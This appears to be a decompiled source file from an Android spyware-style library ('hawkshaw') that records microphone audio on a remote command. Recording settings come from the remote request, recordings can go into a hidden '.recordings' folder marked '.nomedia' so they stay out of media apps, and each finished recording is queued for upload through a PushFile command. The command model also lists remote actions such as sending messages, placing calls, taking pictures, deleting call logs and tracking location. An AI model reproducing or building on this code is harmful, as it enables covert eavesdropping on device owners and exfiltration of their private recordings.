package com.hawkshaw.library.features.media;

import N1.f;
import N1.h;
import N1.i;
import Y1.J;
import Y1.K;
import a3.e;
import a3.j;
import android.content.Context;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.ktextensions.ExceptionsKt;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Locale;
import me.pushy.sdk.lib.jackson.databind.a;
import t3.N;

public final class RecordAudioKt {
    private static final String FILENAME_FORMAT = "yyyy-MM-dd-HH-mm-ss-SSS";
    private static final String FILE_EXTENSION = ".3gp";
    private static final String TAG = "AudioRecorder";

    private static final File getOutputFile(Context context, boolean z4) {
        File file;
        if (z4) {
            file = Environment.getExternalStoragePublicDirectory(".recordings");
            File externalFilesDir = context.getExternalFilesDir(".recordings");
            if (externalFilesDir != null) {
                file = externalFilesDir;
            }
            if (!file.exists()) {
                file.mkdirs();
            }
            File file2 = new File(file, ".nomedia");
            if (!file2.exists()) {
                file2.createNewFile();
            }
        } else {
            file = Environment.getExternalStoragePublicDirectory(Build.VERSION.SDK_INT >= 31 ? Environment.DIRECTORY_RECORDINGS : "Recordings");
            if (!file.exists()) {
                file.mkdirs();
            }
        }
        return new File(file, C0528x.c(new SimpleDateFormat(FILENAME_FORMAT, Locale.getDefault()).format(Long.valueOf(System.currentTimeMillis())), FILE_EXTENSION));
    }

    /* JADX WARNING: type inference failed for: r9v2, types: [java.lang.Object, android.media.MediaRecorder$OnErrorListener] */
    public static final void recordAudio(Context context, Command.RecordAudioRequest recordAudioRequest) {
        K.n(context, "context");
        K.n(recordAudioRequest, "request");
        MediaRecorder a5 = Build.VERSION.SDK_INT >= 31 ? f.a(context) : new MediaRecorder();
        File outputFile = getOutputFile(context, recordAudioRequest.getSaveToPrivate());
        a5.setAudioChannels(recordAudioRequest.getAudioChannelCount());
        a5.setAudioSource(recordAudioRequest.getAudioSource().toAudioSource());
        a5.setOutputFormat(recordAudioRequest.getOutputFormat().toOutputFormat());
        a5.setAudioEncoder(recordAudioRequest.getAudioEncoder().toAudioEncoder());
        a5.setMaxDuration((int) recordAudioRequest.getDuration());
        a5.setAudioSamplingRate(recordAudioRequest.getAudioSampleRate());
        a5.setAudioEncodingBitRate(recordAudioRequest.getAudioBitRate());
        a5.setOutputFile(outputFile);
        a5.setOnErrorListener(new Object());
        a5.setOnInfoListener(new h(outputFile, 0));
        try {
            a5.prepare();
            try {
                a5.start();
                Logger.d$default(Logger.INSTANCE, TAG, "Media Recorder Info: Started", false, 4, (Object) null);
            } catch (Exception e5) {
                ExceptionsKt.logNonFatal(e5);
                Logger.e$default(Logger.INSTANCE, TAG, "RecordAudio failed", (Exception) null, false, 12, (Object) null);
            }
        } catch (Exception e6) {
            Logger.e$default(Logger.INSTANCE, TAG, C0528x.h("Media Recorder Prepare Error: ", e6.getMessage()), (Exception) null, false, 12, (Object) null);
            a5.release();
        }
    }

    /* access modifiers changed from: private */
    public static final void recordAudio$lambda$2$lambda$0(MediaRecorder mediaRecorder, int i5, int i6) {
        Logger.e$default(Logger.INSTANCE, TAG, a.g("Media Recorder Error: What ", i5, ", Extra ", i6), (Exception) null, false, 12, (Object) null);
        mediaRecorder.stop();
        mediaRecorder.release();
    }

    /* access modifiers changed from: private */
    public static final void recordAudio$lambda$2$lambda$1(File file, MediaRecorder mediaRecorder, int i5, int i6) {
        int i7 = i5;
        K.n(file, "$outputFile");
        Logger.d$default(Logger.INSTANCE, TAG, a.g("Media Recorder Info: What ", i7, ", Extra ", i6), false, 4, (Object) null);
        if (i7 == 800) {
            mediaRecorder.stop();
            mediaRecorder.release();
            Command.FileRequest fileRequest = r2;
            String path = file.getPath();
            K.m(path, "getPath(...)");
            Command.FileRequest fileRequest2 = new Command.FileRequest(path, Command.FileRequest.Source.AudioRecording, (Command.FileRequest.Medium) null, 0, false, 28, (j3.f) null);
            CoroutineKt.safeLaunch$default(J.a(N.f9290a), (j) null, new i(new Command(Command.CommandType.PushFile, 0, (Command.ThumbnailRequest) null, fileRequest, (Command.FilesRequest) null, (Command.DeletePendingPushFilesRequest) null, (Command.DeleteFileRequest) null, (Command.AddCallLogRequest) null, (Command.DeleteCallLogRequest) null, (Command.AddContactRequest) null, (Command.DeleteContactRequest) null, (Command.SendMessageRequest) null, (Command.GetLocationRequest) null, (Command.VibrateRequest) null, (Command.FlashRequest) null, (Command.TakePictureRequest) null, (Command.RecordVideoRequest) null, (Command.RecordAudioRequest) null, (Command.PushDeviceInfoRequest) null, (Command.OpenAppRequest) null, (Command.MakeCallRequest) null, (Command.DeviceAudioRequest) null, (Command.OpenDeeplinkRequest) null, (Command.LoginRequest) null, (Command.ScheduleCommandRequest) null, (Command.CancelScheduledCommandRequest) null, (Command.AccessibilityCommandRequest) null, (Command.StartRepeatPushDataRequest) null, (Command.SetDynamicConfigRequest) null, (Command.SyncAppConfigRequest) null, 1073741812, (j3.f) null), (e) null), 1, (Object) null);
        }
    }
}
